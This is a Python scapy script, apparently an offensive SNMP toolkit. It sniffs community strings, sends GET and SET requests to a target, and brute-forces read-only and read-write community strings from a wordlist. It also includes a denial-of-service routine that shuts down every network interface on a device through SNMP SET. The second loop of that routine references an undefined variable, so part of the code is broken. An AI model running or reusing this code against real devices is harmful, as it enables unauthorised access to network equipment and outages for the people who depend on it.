from scapy.all import *
from scapy.layers.snmp import SNMPresponse, SNMPvarbind, SNMPget
from termcolor import colored
from builtins import input

import six

def sniff_snmp(interface):
    six.print_("[*] SNMP sniffing STARTED")
    sniff(filter="udp and port 161 or 162", prn=process_snmp, iface=interface)

def process_snmp(pkt):
    ip_src = pkt[IP].src
    ip_dst = pkt[IP].dst
    output = "\nSrc: " + ip_src + " => Dst: " + ip_dst
    if pkt[SNMP].PDU.haslayer(SNMPset):
        output += " Request: SNMP SET"
    elif pkt[SNMP].PDU.haslayer(SNMPget):
        output += " Request: SNMP GET"

    com = str(pkt[SNMP].community)[2:]
    output += " Community: " + com
    return output

def get(ip_target, oid, interface, com, timeo):
    """ This function performs an SNMP GET request
    :param oid: target ip address
    :type oid: str
    :param ip_target: victim ip address
    :type ip_target: str
    :param com: community string
    :type com: str
    """
    p = IP(
            dst=ip_target
        )/UDP(
            sport=162,
            dport=161
        )/SNMP(
            community=com,
            PDU=SNMPget(varbindlist=[SNMPvarbind(oid=ASN1_OID(oid))])
        )

    return sr1(p, iface=interface, timeout=timeo, verbose=False)
    #six.print_(sr1(p, iface=interface))

def snmp_get(ip_target, oid, interface, com):
    res = get(ip_target, oid, interface, com, 0.75)
    if res != None:
        if res[SNMPresponse].error == 0:
            six.print_(colored("[*] Response: " + str(res[SNMPvarbind].value)[2:], "green"))
        else:
            for i in range(0,6):
                if res[SNMPresponse].error == i:
                    six.print_(colored("[*] Response with error code: " + str(i), "yellow"))
    else:
        six.print_(colored("[!] No response. Maybe community string is not correct.", "red"))

def set(ip_target, oid, val, com, interface, timeo):
    """ This function performs an SNMP SET request
    :param ip_target: victim ip address
    :type ip_target: str
    :param com: community string (default: private)
    :type com: str
    :param oid: Object IDentifier
    :type oid: str.
    :param val: Value to be set
    :type val: str
    """
    p = IP(
            dst=ip_target
        )/UDP(
            sport=162,
            dport=161
        )/SNMP(
            community=com,
            PDU=SNMPset(varbindlist=[SNMPvarbind(oid=ASN1_OID(oid),value=val)])
        )

    return sr1(p, iface=interface, timeout=timeo, verbose=False)

def snmp_set(ip_target, oid, interface, com, value):
    res = set(ip_target, oid, value, com, interface, 0.75)
    if res != None:
        if res[SNMPresponse].error == 0:
            six.print_(colored("[*] SNMP SET succeed!", "green"))
        else:
            for i in range(0,6):
                if res[SNMPresponse].error == i:
                    six.print_(colored("[*] Response with error code: " + str(i), "yellow"))
    else:
        six.print_(colored("[!] No response. Maybe community string is not correct.", "red"))

def dictionary_attack(dict, ip_target, interface):
    f=open(dict, "r")
    content = f.read()
    communities = content.split("\n")
    communities_number = len(communities)
    i = 0
    cont = "y"
    found = False
    six.print_("[*] SNMP Dictionary attack STARTED")
    while cont == "y" and i < communities_number:
        response = get(ip_target, "1.3.6.1.2.1.1.1.0", interface, communities[i], 0.15)
        if response != None:
            if response.haslayer(SNMPresponse):
                if response[SNMPresponse].error == 0:
                    found = True
                    six.print_(colored("[*] Read-Only community string found!! - '" + communities[i] + "'", "green"))
                    cont = "x"
                    while cont != "y" and cont != "n":
                        cont = input("Do you want to continue? (y/n): ")

        response = set(ip_target, "1.3.6.1.2.1.1.6.0", "Location", communities[i], interface, 0.15)
        if response != None:
            if response.haslayer(SNMPresponse):
                if response[SNMPresponse].error == 0:
                    found = True
                    six.print_(colored("[*] Read-Write community string found!! - '" + communities[i] + "'", "green"))
                    cont = "x"
                    while cont != "y" and cont != "n":
                        cont = input("Do you want to continue? (y/n): ")

        i += 1
    six.print_("[*] SNMP Dictionary attack finished. " + str(i) + " community strings tried.")
    if i == communities_number and not found:
        six.print_("[*] No community strings matches found")


def snmp_DoS(ip_target, interface, com):
    run = True
    entry = 1
    six.print_("[*] SNMP Denial of Service attack STARTED")
    #In this while we try first table entries till we get a noAccess error (entry doesn't exist)
    while run:
        #Value 2 = down
        #OID: 1.3.6.1.2.1.2.2.1.Column.ifIndex (column 7 = ifAdminStatus)
        response = set(ip_target, "1.3.6.1.2.1.2.2.1.7." + str(entry), ASN1_INTEGER(2), com, interface, 2)
        if response != None:
            if response[SNMPresponse].error == 0:
                six.print_(colored("[*] Interface with entry index " + str(entry) +" down!" + str(entry), "green"))
                entry += 1
            elif response[SNMPresponse].error == 6:
                run = False
            else:
                six.print_(colored("[!] Error - Something went wrong", "red"))
                exit(0)
        else:
            six.print_(colored("[!] No response. Maybe community string is not correct.", "red"))
            exit(0)

    #In this while we try entries 10001 in advance (Cisco devices uses this entries numbers)
    run = True
    entry = 10001
    while run:
        entry = i
        response = set(ip_target, "1.3.6.1.2.1.2.2.1.7." + str(entry), ASN1_INTEGER(2), com, interface, 2)
        if response[SNMPresponse].error == 0:
            six.print_(colored("[*] Interface with entry index " + str(entry) +" down!", "green"))
            entry += 1
        elif response[SNMPresponse].error == 6:
            run = False
        else:
            six.print_(colored("[!] Error - Something went wrong", "red"))
            exit(0)

    six.print_("[*] SNMP Denial of Service attack FINISHED")




